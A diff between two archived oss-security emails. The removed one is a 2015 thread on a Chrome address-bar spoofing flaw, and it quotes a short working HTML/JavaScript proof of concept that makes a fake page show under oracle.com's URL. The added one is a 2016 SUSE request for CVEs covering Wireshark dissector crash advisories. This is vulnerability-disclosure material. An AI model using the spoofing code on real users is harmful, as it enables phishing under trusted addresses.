@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2746" "Thursday" "2" "July" "2015" "13:51:06" "+0000" "Big Whale" "d0lph1n98@yahoo.com" "<681041526.1096475.1435845066860.JavaMail.yahoo@mail.yahoo.com>" "97" "[oss-security] Re: [FD] Google Chrome Address Spoofing (Request For Comment)" nil nil nil "7" "2015070213:51:06" "[oss-security] Re: [FD] Google Chrome Address Spoofing (Request For Comment)" (number mark "        d0lph1n98@ya Jul  2   97/2746  " thread-indent "\"[oss-security] Re: [FD] Google Chrome Address Spoofing (Request For Comment)\"\n") "<CAP7Z6--Zd8zojRXbevz+xETqvqRGWJKhaY=OL9LL2mRusPMNiA@mail.gmail.com>" ("<CAP7Z6--Zd8zojRXbevz+xETqvqRGWJKhaY=OL9LL2mRusPMNiA@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["5088" "Thursday" "28" "July" "2016" "13:34:27" "+0200" "Andreas Stieger" "astieger@suse.com" "<02218f3b-90ba-87cb-f0f9-2e576eae6917@suse.com>" "111" "[oss-security] CVE request: Wireshark 2.0.5 and 1.12.13 security releases" "^Cc:" nil nil "7" "2016072811:34:27" "[oss-security] CVE request: Wireshark 2.0.5 and 1.12.13 security releases" (number mark "U       astieger@sus Jul 28  111/5088  " thread-indent "\"[oss-security] CVE request: Wireshark 2.0.5 and 1.12.13 security releases\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 21995 invoked by uid 550); 2 Jul 2015 14:30:31 -0000
+Received: (qmail 31924 invoked by uid 550); 28 Jul 2016 11:35:00 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,128 +11,129 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 30277 invoked from network); 2 Jul 2015 13:51:18 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=yahoo.com; s=s2048; t=1435845067; bh=/LDEl8E+RFy76AoLeKIw3GByP7+KA2vI8VFTQ0nkh+A=; h=Date:From:Reply-To:To:Cc:In-Reply-To:References:Subject:From:Subject; b=LkcObOT0BELxcAqrYOnxN1hAKKUrjgo7mO3A/tjjHCMSupUHydV8BCIRFN+5ZxGjGWUloBO9t+3Y1lWACdTzmtDmS0MLs9I/kTK87cOMc6Z+H5HZzaUMNnlWUl+caIinhZI9Fj46ko8urz15PWeESFCgVn9nUvgyEWKBkaOpU69aIi+bTPSqI4/TvC3KJm8i30+aiz+nnF+LqIQ1mYWzx+tb3AE8IV81IGA6cRZ4M15pU8R7HvD2Nqgu3xuSuwIwW0KS0W5hYRGZSG1RPGQQCcYRZTBykvGhDsyptrcT5k7I7nAHHoPs3JemC+OYqJZoCXRd2T/swiWIcq072mzMRQ==
-X-Yahoo-Newman-Property: ymail-3
-X-Yahoo-Newman-Id: 678215.14346.bm@omp1005.mail.ne1.yahoo.com
-X-YMail-OSG: _EBI_S0VM1mhsr0_JFGbCWw_uhU_VgQNiZC4TIMT6RUbJoYPCVQkvwcehFGIWO.
- QiJhPpThWmiIgrNtIlqqs6T9tVnKWpAFUz51NGgy0XBaH_TPQxI1oxXds.aIgeYH9uqCUibUq50e
- isU6iT.0ElChlAlIe9GlOEn1AlXmG.yGBbkt8HvFS4X2UaeFEpZLI6laOVkTQbiGKNgh_45BELiV
- PTIOwAiBUfPm0oDV.ySqZeaP7B7vMuLp001Q9Aba90cjqu97t97FBL7M0vUnFpfh1B0dmgf0ylqz
- fVT_KTJWfSTwlODysiJpx_pCOjYVXvrp2WC35lHsuaKYMIO0h0CetmKBeuwLW1gBw5XRcOvfEX_m
- W54OlbMJ6HPe45GIF.d72d_ogPjFKn93DPF0NUS8HfhW9HpW1j1zcemqd8a5tq0VjbYcI9p6BKBD
- PfngCVgRBf10H7_uZKHy53XtyvtxCnr.7ltwfYbn0NZjuVwKLhwRXHWYC0twEUSWHZIPHLY8miSq
- PzAbc1JW.aLglzPQn5bAB
-Message-ID: <681041526.1096475.1435845066860.JavaMail.yahoo@mail.yahoo.com>
-In-Reply-To: <CAP7Z6--Zd8zojRXbevz+xETqvqRGWJKhaY=OL9LL2mRusPMNiA@mail.gmail.com>
-References: <CAP7Z6--Zd8zojRXbevz+xETqvqRGWJKhaY=OL9LL2mRusPMNiA@mail.gmail.com>
+Received: (qmail 31906 invoked from network); 28 Jul 2016 11:35:00 -0000
+Organization: SUSE Linux GmbH
+Message-ID: <02218f3b-90ba-87cb-f0f9-2e576eae6917@suse.com>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
+ Thunderbird/45.2
 MIME-Version: 1.0
-Content-Type: multipart/alternative; 
-	boundary="----=_Part_1096474_1583321990.1435845066852"
-Cc: "fulldisclosure@seclists.org" <fulldisclosure@seclists.org>, 
-	"bugtraq@securityfocus.com" <bugtraq@securityfocus.com>, 
-	"oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
-Date: Thu, 2 Jul 2015 13:51:06 +0000 (UTC)
-From: Big Whale <d0lph1n98@yahoo.com>
-Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Re: [FD] Google Chrome Address Spoofing (Request For Comment)
-To: Valentinas Bakaitis <v.bakaitis@gmail.com>, 
-	David Leo <david.leo@deusen.co.uk>
-
-------=_Part_1096474_1583321990.1435845066852
-Content-Type: text/plain; charset=UTF-8
+Content-Type: text/plain; charset=utf-8
 Content-Transfer-Encoding: quoted-printable
+Cc: cve-assign@mitre.org
+Date: Thu, 28 Jul 2016 13:34:27 +0200
+From: Andreas Stieger <astieger@suse.com>
+Reply-To: oss-security@lists.openwall.com
+Subject: [oss-security] CVE request: Wireshark 2.0.5 and 1.12.13 security releases
+To: oss-security@lists.openwall.com
 
-Found this POC: musalbas/address-spoofing-poc
-| =C2=A0 |
-| =C2=A0 |  | =C2=A0 | =C2=A0 | =C2=A0 | =C2=A0 | =C2=A0 |
-| musalbas/address-spoofing-pocaddress-spoofing-poc - Chrome address spoofi=
-ng vulnerability proof-of-concept for HTTPS. (Original by David Leo.) |
-|  |
-| View on github.com | Preview by Yahoo |
-|  |
-| =C2=A0 |
+Hello
 
+Wireshark 2.0.5 and 1.12.13 were announced to contain fixes of the usual
+dissector crash / endless loop read from wire or capture file type:
 
-=20
-
-
-     On Thursday, July 2, 2015 9:21 AM, Valentinas Bakaitis <v.bakaitis@gma=
-il.com> wrote:
-=20=20=20
-
- Can you perform any actions on the page once the URL is replaced, or is it
-non responsive? (asking because PoC did not work on my Chrome 43.0.2357.130
-(64-bit) on OSX). If it is non responsive then the impact is very limited.
-Worst thing I can think of is showing "your account is suspended, please
-contact technical support on 0800-555-555" and then using the trust user
-puts in the URL for phone phishing. If it is responsive, then it's indeed
-pretty bad.
-
-Cheers!
-V.
-
-On Tue, Jun 30, 2015 at 6:08 PM, David Leo <david.leo@deusen.co.uk> wrote:
-
-> Impact:
-> The "click to verify" thing is completely broken...
-> Anyone can be "BBB Accredited Business" etc.
-> You can make whitehouse.gov display "We love Islamic State" :-)
->
-> Note:
-> No user interaction on the fake page.
->
-> Code:
-> ***** index.html
-> <script>
-> function next()
-> {
->=C2=A0 =C2=A0 =C2=A0 =C2=A0 w.location.replace('http://www.oracle.com/inde=
-x.html?'+n);n++;
->=C2=A0 =C2=A0 =C2=A0 =C2=A0 setTimeout("next();",15);
->=C2=A0 =C2=A0 =C2=A0 =C2=A0 setTimeout("next();",25);
-> }
-> function f()
-> {
->=C2=A0 =C2=A0 =C2=A0 =C2=A0 w=3Dwindow.open("content.html","_blank","width=
-=3D500 height=3D500");
->
-> i=3DsetInterval("try{x=3Dw.location.href;}catch(e){clearInterval(i);n=3D0=
-;next();}",5);
-> }
-> </script>
-> <a href=3D"#" onclick=3D"f()">Go</a><br>
-> ***** content.html
-> <b>This web page is NOT oracle.com</b>
-> <script>location=3D"http://www.oracle.com/index.html";</script>
-> ***** It's online
-> http://www.deusen.co.uk/items/gwhere.6128645971389012/
-> (The page says "June/16/2015" - it works as we tested today)
->
-> Request For Comment:
-> We reported this to Google.
-> They reproduced, and say
-> It's DoS which doesn't matter.
-> We think it's very strange,
-> since the browser does not crash(not DoS),
-> and the threat is obvious.
-> What's your opinion?
->
-> Kind Regards,
->
-> PS
-> We love clever tricks.
-> We love this:
-> http://dieyu.org/
->
->
-
-_______________________________________________
-Sent through the Full Disclosure mailing list
-https://nmap.org/mailman/listinfo/fulldisclosure
-Web Archives & RSS: http://seclists.org/fulldisclosure/
+https://www.wireshark.org/lists/wireshark-announce/201607/msg00001.html
 
 
-=20=20=
+CORBA IDL dissector crash on 64-bit Windows (wnpa-sec-2016-39)
+It may be possible to make Wireshark crash by injecting a malformed
+packet onto the wire or by convincing someone to read a malformed packet
+trace file. Affects 2.0.0 to 2.0.4, fixed in 2.0.5
+https://www.wireshark.org/security/wnpa-sec-2016-39.html
+https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=3D12495
 
-------=_Part_1096474_1583321990.1435845066852--
+NDS dissector crash (wnpa-sec-2016-40)
+It may be possible to make Wireshark crash by injecting a malformed
+packet onto the wire or by convincing someone to read a malformed packet
+trace file. Affects 1.12.0 to 1.12.12, fixed in 1.12.13.
+https://www.wireshark.org/security/wnpa-sec-2016-40.html
+https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=3D12576
+
+PacketBB dissector could divide by zero (wnpa-sec-2016-41)
+The PacketBB dissector could divide by zero. It may be possible to make
+Wireshark crash by injecting a malformed packet onto the wire or by
+convincing someone to read a malformed packet trace file. Affects 2.0.0
+to 2.0.4, 1.12.0 to 1.12.12, fixed in 2.0.5, 1.12.13.
+https://www.wireshark.org/security/wnpa-sec-2016-41.html
+\https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=3D12577
+
+wnpa-sec-2016-42
+WSP infinite loop (wnpa-sec-2016-42)
+The WSP dissector could go into an infinite loop. It may be possible to
+make Wireshark consume excessive CPU resources by injecting a malformed
+packet onto the wire or by convincing someone to read a malformed packet
+trace file. Affects 2.0.0 to 2.0.4, 1.12.0 to 1.12.12 , fixed in 2.0.5,
+1.12.13
+https://www.wireshark.org/security/wnpa-sec-2016-42.html
+https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=3D12594
+
+MMSE infinite loop (wnpa-sec-2016-43)
+The MMSE dissector could go into an infinite loop. It may be possible to
+make Wireshark consume excessive CPU resources by injecting a malformed
+packet onto the wire or by convincing someone to read a malformed packet
+trace file. Affects 1.12.0 to 1.12.12, fixed 1.12.13
+https://www.wireshark.org/security/wnpa-sec-2016-43.html
+https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=3D12624
+
+RLC long loop (wnpa-sec-2016-44)
+The RLC dissector could go into a long loop. It may be possible to make
+Wireshark consume excessive CPU resources by injecting a malformed
+packet onto the wire or by convincing someone to read a malformed packet
+trace file. Affects  2.0.0 to 2.0.4, 1.12.0 to 1.12.12, fixed in 2.0.5,
+1.12.13.
+https://www.wireshark.org/security/wnpa-sec-2016-44.html
+https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=3D12624
+
+LDSS dissector crash (wnpa-sec-2016-45)
+The LDSS dissector could crash. It may be possible to make Wireshark
+crash by injecting a malformed packet onto the wire or by convincing
+someone to read a malformed packet trace file. Affects 2.0.0 to 2.0.4,
+1.12.0 to 1.12.12, fixed in 2.0.5, 1.12.13.
+https://www.wireshark.org/security/wnpa-sec-2016-45.html
+https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=3D12662
+
+RLC dissector crash (wnpa-sec-2016-46)
+The RLC dissector could crash. It may be possible to make Wireshark
+crash by injecting a malformed packet onto the wire or by convincing
+someone to read a malformed packet trace file. Affects 2.0.0 to 2.0.4,
+1.12.0 to 1.12.12, fixed in 2.0.5, 1.12.13.
+https://www.wireshark.org/security/wnpa-sec-2016-46.html
+https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=3D12664
+
+OpenFlow long loop (wnpa-sec-2016-47)
+The OpenFlow dissector (and possibly others) could go into a long loop.
+It may be possible to make Wireshark consume excessive CPU resources by
+injecting a malformed packet onto the wire or by convincing someone to
+read a malformed packet trace file. Affects 2.0.0 to 2.0.4, 1.12.0 to
+1.12.12, fixed in 2.0.5, 1.12.13.
+https://www.wireshark.org/security/wnpa-sec-2016-47.html
+https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=3D12659
+
+MMSE, WAP, WBXML, and WSP infinite loop (wnpa-sec-2016-48)
+The MMSE, WAP, WBXML, and WSP dissectors could go into an infinite loop.
+It may be possible to make Wireshark crash by injecting a malformed
+packet onto the wire or by convincing someone to read a malformed packet
+trace file. Affects 2.0.0 to 2.0.4, fixed in 2.0.5.
+https://www.wireshark.org/security/wnpa-sec-2016-48.html
+https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=3D12661
+
+WBXML crash (wnpa-sec-2016-49)
+The WBXML dissector could crash. It may be possible to make Wireshark
+crash by injecting a malformed packet onto the wire or by convincing
+someone to read a malformed packet trace file. Affects 2.0.0 to 2.0.4,
+fixed in 2.0.5
+https://www.wireshark.org/security/wnpa-sec-2016-49.html
+https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=3D12663
+
+
+Could CVE please be assigned?
+
+With kind regards,
+Andreas Stieger
+
+--=20
+Andreas Stieger <astieger@suse.com>
+Project Manager Security
+SUSE Linux GmbH, GF: Felix Imend=C3=B6rffer, Jane Smithard, Graham Norton,
+HRB 21284 (AG N=C3=BCrnberg)
+
+
